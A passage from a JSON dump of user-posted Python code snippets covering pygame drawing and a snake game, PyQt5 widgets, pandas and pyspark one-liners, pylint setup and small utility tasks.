    "description": "import pygame pygame.init() window = pygame.display.set_mode((500, 500))   def set_text(string, coordx, coordy, fontSize): #Function to set text      font = pygame.font.Font('freesansbold.ttf', fontSize)      #(0, 0, 0) is black, to make black text     text = font.render(string, True, (0, 0, 0))      textRect = text.get_rect()     textRect.center = (coordx, coordy)      return (text, textRect)  window.fill((255, 255, 255)) #Fills the whole window with white #Places \"Text in Pygame!\" with an x,y coord of 250, 250 and 60 font size totalText = set_text(\"Text in Pygame!\", 250, 250, 60) window.blit(totalText[0], totalText[1]) pygame.display.update()\ndef writeText(string, coordx, coordy, fontSize):   \t#set the font to write with     font = pygame.font.Font('freesansbold.ttf', fontSize)      #(0, 0, 0) is black, to make black text     text = font.render(string, True, (0, 0, 0))     #get the rect of the text     textRect = text.get_rect()     #set the position of the text     textRect.center = (coordx, coordy)     #add text to window \twindow.blit(text, textRect)     #update window \tpygame.display.update()\n\"\"\"system font\"\"\" font = pygame.font.SysFont(\"Segoe UI\", 35)  \"\"\"font from .ttf file\"\"\" font = pygame.font.Font(\"path/to/font.ttf\", 35)  textsurface = font.render(\"text\", False, color)  # \"text\", antialias, color surface.blit(textsurface, (x, y))\n",
    "reg_date": "2021-10-12T11:32:36.000Z"
  },
  {
    "id": 2934,
    "keyword": null,
    "link": null,
    "title": " pygame scale image",
    "description": "import pygame picture = pygame.image.load(filename) picture = pygame.transform.scale(picture, (1280, 720)) \n\"\"\"Load image\"\"\" # I'm loading an image, but that does not matter. surface = pygame.image.load(\"path/to/file.png\").convert() # Documentation for Surface.convert() and Surface.convert_alpha(): # https://www.pygame.org/docs/ref/surface.html#pygame.Surface.convert  \"\"\"Scale / resize surface\"\"\" surface = pygame.transform.scale(surface=surface, size=(50, 50)) # In depth documentation: # https://www.pygame.org/docs/ref/transform.html#pygame.transform.rotate\nimport pygame import pygame.font  pygame.init() size = (400,400) screen = pygame.display.set_mode(size) clock = pygame.time.Clock()  def blitRotate(surf, image, pos, originPos, angle):      # calcaulate the axis aligned bounding box of the rotated image     w, h       = image.get_size()     box        = [pygame.math.Vector2(p) for p in [(0, 0), (w, 0), (w, -h), (0, -h)]]     box_rotate = [p.rotate(angle) for p in box]     min_box    = (min(box_rotate, key=lambda p: p[0])[0], min(box_rotate, key=lambda p: p[1])[1])     max_box    = (max(box_rotate, key=lambda p: p[0])[0], max(box_rotate, key=lambda p: p[1])[1])      # calculate the translation of the pivot      pivot        = pygame.math.Vector2(originPos[0], -originPos[1])     pivot_rotate = pivot.rotate(angle)     pivot_move   = pivot_rotate - pivot      # calculate the upper left origin of the rotated image     origin = (pos[0] - originPos[0] + min_box[0] - pivot_move[0], pos[1] - originPos[1] - max_box[1] + pivot_move[1])      # get a rotated image     rotated_image = pygame.transform.rotate(image, angle)      # rotate and blit the image     surf.blit(rotated_image, origin)      # draw rectangle around the image     pygame.draw.rect (surf, (255, 0, 0), (*origin, *rotated_image.get_size()),2)  font = pygame.font.SysFont('Times New Roman', 50) text = font.render('image', False, (255, 255, 0)) image = pygame.Surface((text.get_width()+1, text.get_height()+1)) pygame.draw.rect(image, (0, 0, 255), (1, 1, *text.get_size())) image.blit(text, (1, 1)) w, h = image.get_size()  angle = 0 done = False while not done:     clock.tick(60)     for event in pygame.event.get():         if event.type == pygame.QUIT:             done = True         elif event.type == pygame.KEYDOWN:             if event.key==pygame.K_ESCAPE:                 done = True      pos = (screen.get_width()//2, screen.get_height()//2)     pos = (200, 200)      screen.fill(0)     blitRotate(screen, image, pos, (w//2, h//2), angle)     angle += 1      pygame.draw.line(screen, (0, 255, 0), (pos[0]-20, pos[1]), (pos[0]+20, pos[1]), 3)     pygame.draw.line(screen, (0, 255, 0), (pos[0], pos[1]-20), (pos[0], pos[1]+20), 3)     pygame.draw.circle(screen, (0, 255, 0), pos, 7, 0)      pygame.display.flip()  pygame.quit() \nimage = pygame.image.load(\"path/to/file.png\")  # load image  width, height = image.get_width(), image.get_height()  # get size print(width, height)  # print size  \"\"\" OUTPUT: (50, 50) \"\"\"\n#Start Libraries import pygame, sys from pygame.locals import * #End Libraries  pygame.init() #We're initializing the script  pygame.display.set_caption('Platform') #This is the name of the window window_size = (600,400) #The size of the window screen = pygame.display.set_mode(window_size) #Initializing the screen  image_not_scaled = pygame.image.load('file_path.png').convert() #Importing the image image = pygame.transform.scale(image_not_scaled, (32, 32)) #You can insert whatever you want for example (64, 64) \t\t\t\t\t\t\t\t\t\t\t\t\t\t   #It MUST be a tuple  #Now we'll create the while loop run = True #With this we can control the script (stop it) while run: #For NOW itz a simple while true     screen.fill((255, 255, 255)) #Filling the screen with white     screen.blit(image, (0, 0)) #Blitting the image on the screen      for event in pygame.event.get(): #Checking the events         if event.type == QUIT: #Checking if the event is QUIT             pygame.quit() #In that case we'll exit from pygame             sys.exit() #In that case we'll exit from the script          pygame.display.update() #Updating the screen \nimport pygame  # Load picture picture = pygame.image.load(\"your/file/directery.png\") # choose a picture and spesefy directery  # Resize picture = pygame.transform.scale(picture # spesefy the objekt, (100, 100))# here is the scale by pixels\n",
    "reg_date": "2021-10-12T11:32:36.000Z"
  },
  {
    "id": 2935,
    "keyword": null,
    "link": null,
    "title": " pygame scale image python",
    "description": "import pygame picture = pygame.image.load(filename) picture = pygame.transform.scale(picture, (1280, 720)) \n",
    "reg_date": "2021-10-12T11:32:36.000Z"
  },
  {
    "id": 2936,
    "keyword": null,
    "link": null,
    "title": " pygame snake",
    "description": "import pygame import time import random   pygame.init()   white = (255, 255, 255) yellow = (255, 255, 102) black = (0, 0, 0) red = (213, 50, 80) green = (0, 255, 0) blue = (50, 153, 213)   dis_width = 600 dis_height = 400   dis = pygame.display.set_mode((dis_width, dis_height)) pygame.display.set_caption('Snake Game by Edureka')   clock = pygame.time.Clock()   snake_block = 10 snake_speed = 15   font_style = pygame.font.SysFont(\"bahnschrift\", 25) score_font = pygame.font.SysFont(\"comicsansms\", 35)     def Your_score(score):     value = score_font.render(\"Your Score: \" + str(score), True, yellow)     dis.blit(value, [0, 0])       def our_snake(snake_block, snake_list):     for x in snake_list:         pygame.draw.rect(dis, black, [x[0], x[1], snake_block, snake_block])     def message(msg, color):     mesg = font_style.render(msg, True, color)     dis.blit(mesg, [dis_width / 6, dis_height / 3])     def gameLoop():     game_over = False     game_close = False       x1 = dis_width / 2     y1 = dis_height / 2       x1_change = 0     y1_change = 0       snake_List = []     Length_of_snake = 1       foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0     foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0       while not game_over:           while game_close == True:             dis.fill(blue)             message(\"You Lost! Press C-Play Again or Q-Quit\", red)             Your_score(Length_of_snake - 1)             pygame.display.update()               for event in pygame.event.get():                 if event.type == pygame.KEYDOWN:                     if event.key == pygame.K_q:                         game_over = True                         game_close = False                     if event.key == pygame.K_c:                         gameLoop()           for event in pygame.event.get():             if event.type == pygame.QUIT:                 game_over = True             if event.type == pygame.KEYDOWN:                 if event.key == pygame.K_LEFT:                     x1_change = -snake_block                     y1_change = 0                 elif event.key == pygame.K_RIGHT:                     x1_change = snake_block                     y1_change = 0                 elif event.key == pygame.K_UP:                     y1_change = -snake_block                     x1_change = 0                 elif event.key == pygame.K_DOWN:                     y1_change = snake_block                     x1_change = 0           if x1 >= dis_width or x1 < 0 or y1 >= dis_height or y1 < 0:             game_close = True         x1 += x1_change         y1 += y1_change         dis.fill(blue)         pygame.draw.rect(dis, green, [foodx, foody, snake_block, snake_block])         snake_Head = []         snake_Head.append(x1)         snake_Head.append(y1)         snake_List.append(snake_Head)         if len(snake_List) > Length_of_snake:             del snake_List[0]           for x in snake_List[:-1]:             if x == snake_Head:                 game_close = True           our_snake(snake_block, snake_List)         Your_score(Length_of_snake - 1)           pygame.display.update()           if x1 == foodx and y1 == foody:             foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0             foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0             Length_of_snake += 1           clock.tick(snake_speed)       pygame.quit()     quit()     gameLoop() \n",
    "reg_date": "2021-10-12T11:32:36.000Z"
  },
  {
    "id": 2937,
    "keyword": null,
    "link": null,
    "title": " pygame template",
    "description": "import pygame,sys  #game initialization pygame.init() window = pygame.display.set_mode((900,600),0,32) pygame.display.set_caption('Basic Pygame Template') clock = pygame.time.Clock()  #game loop while True:     for event in pygame.event.get():         if event.type == pygame.QUIT:             pygame.quit()             sys.exit()     #game code here          pygame.display.update()     clock.tick(60) \n",
    "reg_date": "2021-10-12T11:32:37.000Z"
  },
  {
    "id": 2938,
    "keyword": null,
    "link": null,
    "title": " pygame window",
    "description": "import pygame pygame.init() back = (192,192,192) gameDisplay = pygame.display.set_mode((800,600)) pygame.display.set_caption('A bit Racey') gameDisplay.fill(back) clock = pygame.time.Clock() running = True while running:     for event in pygame.event.get():         if event.type == pygame.QUIT:             running = False     pygame.display.update()     clock.tick(60)    pygame.quit() quit()              \nimport pygame pygame.init() #initialize pygame SCREEN_WIDTH = 600 # width (in px) SCREEN_HEIGHT = 800 # height (in px)  WIN = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT)) # creates a screen of 600px X 800px  while True: \tpygame.display.update() # updates the screen\nimport pygame pygame.init() screen = pygame.display.set_mode((800,600)) pygame.display.set_caption('A bit Racey') clock = pygame.time.Clock() running = True while running:     for event in pygame.event.get():         if event.type == pygame.QUIT:             running = False     pygame.display.update()     clock.tick(80)    pygame.quit() quit()\nimport pygame  pygame.init()  \"\"\"this is how to make a pygame window, the 500,500 is the size of the window btw(it is your choice what the size is ) \"\"\"  var = pygame.display.set_mode((500,500))  \"\"\"this is how to change the title of the window\"\"\" pygame.display.set_caption('example') \nimport pygame  # The background color can be whatever you want background_colour = (255,255,255) (width, height) = (300, 200) screen = pygame.display.set_mode((width, height)) pygame.display.set_caption('Tutorial 1') screen.fill(background_colour) pygame.display.flip() running = True while running:   for event in pygame.event.get():     if event.type == pygame.QUIT:       running = False\nimport pygame  pygame.init()  win = pygame.display.set_mode((800,600)) pygame.display.set_caption('A bit Racey') win.fill(255,255,255)\n",
    "reg_date": "2021-10-12T11:32:37.000Z"
  },
  {
    "id": 2939,
    "keyword": null,
    "link": null,
    "title": " pyhton find dates in weeks",
    "description": ">>> import datetime >>> datetime.date(2010, 6, 16).isocalendar()[1] 24\n",
    "reg_date": "2021-10-12T11:32:37.000Z"
  },
  {
    "id": 2940,
    "keyword": null,
    "link": null,
    "title": " pyhton functions for list",
    "description": "list.append(x) # append x to end of list list.extend(iterable) # append all elements of iterable to list list.insert(i, x) # insert x at index i list.remove(x) # remove first occurance of x from list list.pop([i]) # pop element at index i (defaults to end of list) list.clear() # delete all elements from the list list.index(x[, start[, end]]) # return index of element x list.count(x) # return number of occurances of x in list list.reverse() # reverse elements of list in-place (no return) list.sort(key=None, reverse=False) # sort list in-place list.copy() # return a shallow copy of the list\n# empty list print(list())  # vowel string vowel_string = 'aeiou' print(list(vowel_string))  # vowel tuple vowel_tuple = ('a', 'e', 'i', 'o', 'u') print(list(vowel_tuple))  # vowel list vowel_list = ['a', 'e', 'i', 'o', 'u'] print(list(vowel_list))\n",
    "reg_date": "2021-10-12T11:32:37.000Z"
  },
  {
    "id": 2941,
    "keyword": null,
    "link": null,
    "title": " pyhton permutations",
    "description": "# A Python program to print all permutations using library function  from itertools import permutations perm = permutations([1, 2, 3]) for i in list(perm):     print (i) # (1, 2, 3) # (1, 3, 2) # (2, 1, 3) # (2, 3, 1) # (3, 1, 2) # (3, 2, 1)\n",
    "reg_date": "2021-10-12T11:32:37.000Z"
  },
  {
    "id": 2942,
    "keyword": null,
    "link": null,
    "title": " pyinstaller for spacy code",
    "description": "# HOOK FILE FOR SPACY from PyInstaller.utils.hooks import collect_all  # ----------------------------- SPACY ----------------------------- data = collect_all('spacy')  datas = data[0] binaries = data[1] hiddenimports = data[2]  # ----------------------------- THINC ----------------------------- data = collect_all('thinc')  datas += data[0] binaries += data[1] hiddenimports += data[2]  # ----------------------------- CYMEM ----------------------------- data = collect_all('cymem')  datas += data[0] binaries += data[1] hiddenimports += data[2]  # ----------------------------- PRESHED ----------------------------- data = collect_all('preshed')  datas += data[0] binaries += data[1] hiddenimports += data[2]  # ----------------------------- BLIS -----------------------------  data = collect_all('blis')  datas += data[0] binaries += data[1] hiddenimports += data[2]  # ----------------------------- OTHER ----------------------------  hiddenimports += ['srsly.msgpack.util']   from PyInstaller.utils.hooks import collect_data_files datas = collect_data_files(\"en_core_web_sm\")\n",
    "reg_date": "2021-10-12T11:32:37.000Z"
  },
  {
    "id": 2943,
    "keyword": null,
    "link": null,
    "title": " pylint: disable=unused-argument",
    "description": "# pylint: disable=unused-argument\n",
    "reg_date": "2021-10-12T11:32:37.000Z"
  },
  {
    "id": 2944,
    "keyword": null,
    "link": null,
    "title": " pylint",
    "description": "# Windows & Mac OS pip install pylint  # Debian sudo apt-get install pylint  # Fedora sudo dnf install pylint  # openSUSE sudo zypper install python3-pylint   # Arch Linux pacman -S python-pylint\npip install pylint # see note\npip install pylint # see note # or pip3 install pylint # see note\n",
    "reg_date": "2021-10-12T11:32:37.000Z"
  },
  {
    "id": 2945,
    "keyword": null,
    "link": null,
    "title": " pylint no name in module cv2",
    "description": "\"python.linting.pylintArgs\":[\"--extension-pkg-whitelist=cv2\"]  #if that still doesn't work you can also use \"python.linting.pylintArgs\":[\"--generate-members\"]\n",
    "reg_date": "2021-10-12T11:32:37.000Z"
  },
  {
    "id": 2946,
    "keyword": null,
    "link": null,
    "title": " pynput mouse click",
    "description": "from pynput.mouse import Button, Controller  mouse = Controller()  # Read pointer position print('The current pointer position is {0}'.format(     mouse.position))  # Set pointer position mouse.position = (10, 20) print('Now we have moved it to {0}'.format(     mouse.position))  # Move pointer relative to current position mouse.move(5, -5)  # Press and release mouse.press(Button.left) mouse.release(Button.left)  # Double click; this is different from pressing and releasing # twice on Mac OSX mouse.click(Button.left, 2)  # Scroll two steps down mouse.scroll(0, 2) \nfrom pynput.mouse import Listener  def on_move(x, y):     print('Pointer moved to {0}'.format(         (x, y)))  def on_click(x, y, button, pressed):     print('{0} at {1}'.format(         'Pressed' if pressed else 'Released',         (x, y)))     if not pressed:         # Stop listener         return False  def on_scroll(x, y, dx, dy):     print('Scrolled {0}'.format(         (x, y)))  # Collect events until released with Listener(         on_move=on_move,         on_click=on_click,         on_scroll=on_scroll) as listener:     listener.join() \nfrom pynput.mouse import Button, Controller  mouse = Controller()  # Read pointer position print('The current pointer position is {0}'.format(mouse.position))  # Set pointer position mouse.position = (10, 20) print('Now we have moved it to {0}'.format(mouse.position))  # Move pointer relative to current position mouse.move(5, -5)  # Press and release mouse.press(Button.left) mouse.release(Button.left)  # Double click; this is different from pressing and releasing # twice on Mac OSX mouse.click(Button.left, 2)  # Scroll two steps down mouse.scroll(0, 2)\n",
    "reg_date": "2021-10-12T11:32:37.000Z"
  },
  {
    "id": 2947,
    "keyword": null,
    "link": null,
    "title": " pyodbc sql server connection string",
    "description": "import pyodbc  # Some other example server values are # server = 'localhost\\sqlexpress' # for a named instance # server = 'myserver,port' # to specify an alternate port server = 'tcp:myserver.database.windows.net'  database = 'mydb'  username = 'myusername'  password = 'mypassword'  cnxn = pyodbc.connect('DRIVER={ODBC Driver 17 for SQL Server};SERVER='+server+';DATABASE='+database+';UID='+username+';PWD='+ password) cursor = cnxn.cursor()\nconn = pyodbc.connect('DRIVER={ODBC Driver 17 for SQL Server};SERVER=test;DATABASE=test;UID=user;PWD=password')\n",
    "reg_date": "2021-10-12T11:32:37.000Z"
  },
  {
    "id": 2948,
    "keyword": null,
    "link": null,
    "title": " pyplot attributes",
    "description": ">>> plot(x, y, 'go--', linewidth=2, markersize=12) >>> plot(x, y, color='green', marker='o', linestyle='dashed', ...      linewidth=2, markersize=12) \nfrom matplotlib import pyplot as plt plt.plot([0, 1, 2, 3, 4, 5], [0, 1, 4, 9, 16, 25]) plt.show()\n",
    "reg_date": "2021-10-12T11:32:38.000Z"
  },
  {
    "id": 2949,
    "keyword": null,
    "link": null,
    "title": " pyplot not show axis",
    "description": "plt.axis('off')\nfrom numpy import random import matplotlib.pyplot as plt  data = random.random((5,5)) img = plt.imshow(data, interpolation='nearest') img.set_cmap('hot') plt.axis('off') plt.savefig(\"test.png\", bbox_inches='tight')\n",
    "reg_date": "2021-10-12T11:32:38.000Z"
  },
  {
    "id": 2950,
    "keyword": null,
    "link": null,
    "title": " pyqt5 change window title",
    "description": "self.setWindowTitle(title)\n",
    "reg_date": "2021-10-12T11:32:38.000Z"
  },
  {
    "id": 2951,
    "keyword": null,
    "link": null,
    "title": " pyqt5 hello world",
    "description": "import sys from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel  # you can copy and run this code  class MainWindow(QMainWindow):     def __init__(self, parent=None):         super(MainWindow, self).__init__(parent)         self.setWindowTitle(\"Hello World\")         label = QLabel(\"Hello World\", self)                  self.show()  if __name__ == \"__main__\":     app = QApplication(sys.argv)     window = MainWindow()     sys.exit(app.exec_())\nimport sys from PyQt5.QtCore import * from PyQt5.QtGui import * from PyQt5.QtWidgets import * class window(QWidget):    def __init__(self, parent = None):       super(window, self).__init__(parent)       self.resize(200,50)       self.setWindowTitle(\"PyQt5\")       self.label = QLabel(self)       self.label.setText(\"Hello World\")       font = QFont()       font.setFamily(\"Arial\")       font.setPointSize(16)       self.label.setFont(font)       self.label.move(50,20) def main():    app = QApplication(sys.argv)    ex = window()    ex.show()    sys.exit(app.exec_()) if __name__ == '__main__':    main()\n",
    "reg_date": "2021-10-12T11:32:38.000Z"
  },
  {
    "id": 2952,
    "keyword": null,
    "link": null,
    "title": " pyqt5 messagebox seticon",
    "description": "messageBox.setIcon(QMessageBox.Information)\n",
    "reg_date": "2021-10-12T11:32:38.000Z"
  },
  {
    "id": 2953,
    "keyword": null,
    "link": null,
    "title": " pyqt5 video player",
    "description": "from PyQt5.QtCore import QDir, Qt, QUrl from PyQt5.QtMultimedia import QMediaContent, QMediaPlayer from PyQt5.QtMultimediaWidgets import QVideoWidget from PyQt5.QtWidgets import (QApplication, QFileDialog, QHBoxLayout, QLabel,         QPushButton, QSizePolicy, QSlider, QStyle, QVBoxLayout, QWidget) from PyQt5.QtWidgets import QMainWindow,QWidget, QPushButton, QAction from PyQt5.QtGui import QIcon import sys   class VideoPlayer(QMainWindow):     def __init__(self):         super().__init__()         self.setWindowTitle(\"PyQt5 Video Player\")            self.mediaPlayer = QMediaPlayer(None, QMediaPlayer.VideoSurface)           videoWidget = QVideoWidget()           self.playButton = QPushButton()         self.playButton.setEnabled(False)         self.playButton.setIcon(self.style().standardIcon(QStyle.SP_MediaPlay))         self.playButton.clicked.connect(self.play)           self.positionSlider = QSlider(Qt.Horizontal)         self.positionSlider.setRange(0, 0)         self.positionSlider.sliderMoved.connect(self.setPosition)           self.error = QLabel()         self.error.setSizePolicy(QSizePolicy.Preferred, QSizePolicy.Maximum)           openButton = QPushButton(\"Open Video\")            openButton.setToolTip(\"Open Video File\")         openButton.setStatusTip(\"Open Video File\")         openButton.setFixedHeight(24)         openButton.clicked.connect(self.openFile)             # Create a widget for window contents         wid = QWidget(self)         self.setCentralWidget(wid)           # Create layouts to place inside widget         controlLayout = QHBoxLayout()         controlLayout.setContentsMargins(0, 0, 0, 0)         controlLayout.addWidget(self.playButton)         controlLayout.addWidget(self.positionSlider)           layout = QVBoxLayout()         layout.addWidget(videoWidget)         layout.addLayout(controlLayout)         layout.addWidget(self.error)         layout.addWidget(openButton)           # Set widget to contain window contents         wid.setLayout(layout)           self.mediaPlayer.setVideoOutput(videoWidget)         self.mediaPlayer.stateChanged.connect(self.mediaStateChanged)         self.mediaPlayer.positionChanged.connect(self.positionChanged)         self.mediaPlayer.durationChanged.connect(self.durationChanged)         self.mediaPlayer.error.connect(self.handleError)       def openFile(self):         fileName, _ = QFileDialog.getOpenFileName(self, \"Open Movie\",                 QDir.homePath())           if fileName != '':             self.mediaPlayer.setMedia(                     QMediaContent(QUrl.fromLocalFile(fileName)))             self.playButton.setEnabled(True)       def exitCall(self):         sys.exit(app.exec_())       def play(self):         if self.mediaPlayer.state() == QMediaPlayer.PlayingState:             self.mediaPlayer.pause()         else:             self.mediaPlayer.play()       def mediaStateChanged(self, state):         if self.mediaPlayer.state() == QMediaPlayer.PlayingState:             self.playButton.setIcon(                     self.style().standardIcon(QStyle.SP_MediaPause))         else:             self.playButton.setIcon(                     self.style().standardIcon(QStyle.SP_MediaPlay))       def positionChanged(self, position):         self.positionSlider.setValue(position)       def durationChanged(self, duration):         self.positionSlider.setRange(0, duration)       def setPosition(self, position):         self.mediaPlayer.setPosition(position)       def handleError(self):         self.playButton.setEnabled(False)         self.error.setText(\"Error: \" + self.mediaPlayer.errorString())     app = QApplication(sys.argv) videoplayer = VideoPlayer() videoplayer.resize(640, 480) videoplayer.show() sys.exit(app.exec_()) \n",
    "reg_date": "2021-10-12T11:32:38.000Z"
  },
  {
    "id": 2954,
    "keyword": null,
    "link": null,
    "title": " pyqt change background color",
    "description": "class Window(QMainWindow):     def __init__(self):         super().__init__()         self.init_me()      def init_me(self):         self.setGeometry(600, 250, 750, 500)         self.setStyleSheet(\"background:gray\")  <----         # or         # self.setStyleSheet(\"background:rgb(r:int,g:int,b:int)\")  <----          self.show()          # to change the color of the text: # self.setStyleSheet(\"color:rgb(...)\") # or to change both at the same time: # self.setStyleSheet(\"color: rgb(...);background: rgb(...)\") # you can do that with any QWidget object or class that inherits QWidget, # eg. QPushButton, QLabel, ...\n",
    "reg_date": "2021-10-12T11:32:38.000Z"
  },
  {
    "id": 2955,
    "keyword": null,
    "link": null,
    "title": " pyqt text in widget frame",
    "description": "self.frame = QtGui.QGroupBox(self)     self.frame.setTitle(\"Hello World\")\n",
    "reg_date": "2021-10-12T11:32:38.000Z"
  },
  {
    "id": 2956,
    "keyword": null,
    "link": null,
    "title": " pyspark convert float results to integer replace",
    "description": "data_df = data_df.withColumn(\"Plays\", data_df[\"Plays\"].cast(IntegerType()))\n",
    "reg_date": "2021-10-12T11:32:38.000Z"
  },
  {
    "id": 2957,
    "keyword": null,
    "link": null,
    "title": " pyspark session",
    "description": "from pyspark.sql import SparkSession spark = SparkSession.builder.master(\"yarn\").appName(\"my app\").enableHiveSupport().getOrCreate()\n",
    "reg_date": "2021-10-12T11:32:38.000Z"
  },
  {
    "id": 2958,
    "keyword": null,
    "link": null,
    "title": " pyspark take random sample",
    "description": "#if replacement=true to allow duplicate entries in the sample & false otherwise. #0.5 = sample size #5 =seed df.sample(true, 0.5, 5)\n",
    "reg_date": "2021-10-12T11:32:39.000Z"
  },
  {
    "id": 2959,
    "keyword": null,
    "link": null,
    "title": " pytesseract tesseract is not installed",
    "description": "#1. Install tesseract using windows installer available at: https://github.com/UB-Mannheim/tesseract/wiki  #2. Note the tesseract path from the installation.Default installation path at the time the time of this edit was: C:\\Users\\USER\\AppData\\Local\\Tesseract-OCR. It may change so please check the installation path.  #3. pip install pytesseract  #4. Set the tesseract path in the script before calling image_to_string:  pytesseract.pytesseract.tesseract_cmd = r'C:\\Users\\USER\\AppData\\Local\\Tesseract-OCR\\tesseract.exe'\nsudo apt update sudo apt install tesseract-ocr sudo apt install libtesseract-dev \n",
    "reg_date": "2021-10-12T11:32:39.000Z"
  },
  {
    "id": 2960,
    "keyword": null,
    "link": null,
    "title": " pytest skip",
    "description": "import pytest @pytest.mark.skip def test_greater_equal():    num = 100    assert num >= 100\n",
    "reg_date": "2021-10-12T11:32:39.000Z"
  },
  {
    "id": 2961,
    "keyword": null,
    "link": null,
    "title": " pytho list items to int",
    "description": "numbers = [ int(x) for x in numbers ]\n",
    "reg_date": "2021-10-12T11:32:39.000Z"
  },
  {
    "id": 2962,
    "keyword": null,
    "link": null,
    "title": " pytho narrondir un nombre",
    "description": "round(3.1415) # 3   x = 1.4567 >>> round(x,2) # 1.46\n",
    "reg_date": "2021-10-12T11:32:39.000Z"
  },
  {
    "id": 2963,
    "keyword": null,
    "link": null,
    "title": " python: change column name",
    "description": "df = df.rename(columns = {'myvar':'myvar_new'})\n",
    "reg_date": "2021-10-12T11:32:39.000Z"
  },
  {
    "id": 2964,
    "keyword": null,
    "link": null,
    "title": " python: left join",
    "description": "new_df = df_1.merge(df_2, on='id', how='left', indicator=True)\n",
    "reg_date": "2021-10-12T11:32:39.000Z"
  },
  {
    "id": 2965,
    "keyword": null,
    "link": null,
    "title": " python: measure time code",
    "description": "import time  # Calculate the power of two for a defined range of number def power_two(my_range):     return [x**2 for x in range(my_range)]   # Measure time def measure_time(func):     start = time.time()     func()               # any specific function to measure     end = time.time()     print(end - start)        measure_time(lambda: power_two(10000000)) # lambda permits to pass the argument of our function\n",
    "reg_date": "2021-10-12T11:32:39.000Z"
  },
  {
    "id": 2966,
    "keyword": null,
    "link": null,
    "title": " python: np.arange decimal places",
    "description": "# It's embarrassing that python's range accumulate rounding errors # when using decimal step. # It's easy to implement a generator that does this even without accumulating # rounding errors. # # Lot of suggestions were made at  https://stackoverflow.com/questions/477486/how-to-use-a-decimal-range-step-value # Going through the forum, a general solution is presented below. # The seq function use generates ranges with decimal step without rounding error   def seq(start, stop, step=1):     n = int(round((stop - start)/float(step)))     const = pow(step,-1)     if n > 1:         return([start + (i/const) for i in range(n+1)])     elif n == 1:         return([start])     else:         return([])                # The seq function above works fine though may have performance issue  # because of the use of power and division. Its therefore advice to # use it only when rounding error is of atmost concern. \n",
    "reg_date": "2021-10-12T11:32:39.000Z"
  },
  {
    "id": 2967,
    "keyword": null,
    "link": null,
    "title": " python: remove duplicate in a specific column",
    "description": "df = df.drop_duplicates(subset=['Column1', 'Column2'], keep='first')\ndf.drop_duplicates(['A','B'],keep= 'last')\n",
    "reg_date": "2021-10-12T11:32:39.000Z"
  },
  {
    "id": 2968,
    "keyword": null,
    "link": null,
    "title": " python: remove specific values in a dataframe",
    "description": "df.drop(df.index[df['myvar'] == 'specific_name'], inplace = True)\ndf = df[df.line_race != 0]\n",
    "reg_date": "2021-10-12T11:32:40.000Z"
  },
  {
    "id": 2969,
    "keyword": null,
    "link": null,
    "title": " python: transform as type numeirc",
    "description": "df['myvar'] = df['myvar'].astype(str)   # Transform as character df['myvar'] = df['myvar'].astype(float) # Transform as float df['myvar'] = df['myvar'].astype(int)   # Transform as numeric\n",
    "reg_date": "2021-10-12T11:32:40.000Z"
  },
  {
    "id": 2970,
    "keyword": null,
    "link": null,
    "title": " python- number of row in a dataframe",
    "description": "index = df.index number_of_rows = len(index)\nlen(df[df['score'] == 1.0])\n# Returns the number of rows in this DataFrame  df.count() # 2\nnumber_of_rows = len(df)\n",
    "reg_date": "2021-10-12T11:32:40.000Z"
  },
  {
    "id": 2971,
    "keyword": null,
    "link": null,
    "title": " python",
    "description": "print(\"Hello World!\")\nprint(\"Hello World\")\nPython is a high-level programming language designed to be easy to read and simple to implement. It is open source, which means it is free to use, even for commercial applications. Python can run on Mac, Windows, and Unix systems and has also been ported to Java and .NET virtual machines.  Your welcome fellow coder :)\n# Nice choice!\nUpvote this if you are here to install python\nname = input(\"write your name: \") print(f\"Hello {name} :D\") \nGreat choice, great language, have fun coding!\npy -m pip install -r requirements.txt \nPython is a high-leval programming language Which is easy to use and simple and  is one of the open sourse programming language is used is many applications  such as Uber,Dropbox,Google and etc for your knowledge Guido van Rossum is  the creator of python.\nPython is an interpreted, high-level,  general-purpose programming language.  //as you can also see to your right --------------------->  but also note interpreted, not compiled. \n",
    "reg_date": "2021-10-12T11:32:40.000Z"
  },
  {
    "id": 2972,
    "keyword": null,
    "link": null,
    "title": " python3 base64 encode basic authentication",
    "description": "userpass = username + ':' + password encoded_u = base64.b64encode(userpass.encode()).decode() headers = {\"Authorization\" : \"Basic %s\" % encoded_u}\nalll run\n",
    "reg_date": "2021-10-12T11:32:40.000Z"
  },
  {
    "id": 2973,
    "keyword": null,
    "link": null,
    "title": " python3 hello world",
    "description": "print(\"Hello World\") //prints Hello World to the console\nprint(\"Hello World!\")\n#Look at these ones, they are all right print(\"Hello World\") #for python 2: print \"Hello World\"\nWelcome to Python bro!\n",
    "reg_date": "2021-10-12T11:32:40.000Z"
  },
  {
    "id": 2974,
    "keyword": null,
    "link": null,
    "title": " python3 iterate through indexes",
    "description": "items=['baseball','basketball','football'] for index, item in enumerate(items):     print(index, item)\ncolors = [\"red\", \"green\", \"blue\", \"purple\"]  for i in range(len(colors)):     print(colors[i]) \n",
    "reg_date": "2021-10-12T11:32:40.000Z"
  },
  {
    "id": 2975,
    "keyword": null,
    "link": null,
    "title": " python3 play a mp3",
    "description": "#pip install playsound from playsound import playsound playsound('your mp3 file.mp3')\n",
    "reg_date": "2021-10-12T11:32:40.000Z"
  },
  {
    "id": 2976,
    "keyword": null,
    "link": null,
    "title": " python3 return a list of indexes of a specific character in a string",
    "description": "string='mississippi' s='s' lst= [] for i in range(len(string)):     if (string[i] == s):         lst.append(i) print(lst) #result: [2, 3, 5, 6]\n",
    "reg_date": "2021-10-12T11:32:40.000Z"
  },
  {
    "id": 2977,
    "keyword": null,
    "link": null,
    "title": " python3 shebang",
    "description": "#!/usr/bin/env python3\n#!/usr/bin/python3\n#!/usr/bin/env python \n",
    "reg_date": "2021-10-12T11:32:41.000Z"
  },
  {
    "id": 2978,
    "keyword": null,
    "link": null,
    "title": " python3 strip punctuation from string",
    "description": "import string #make translator object translator=str.maketrans('','',string.punctuation) string_name=string_name.translate(translator)\n",
    "reg_date": "2021-10-12T11:32:41.000Z"
  },
  {
    "id": 2979,
    "keyword": null,
    "link": null,
    "title": " python3 vowels and consonants filter",
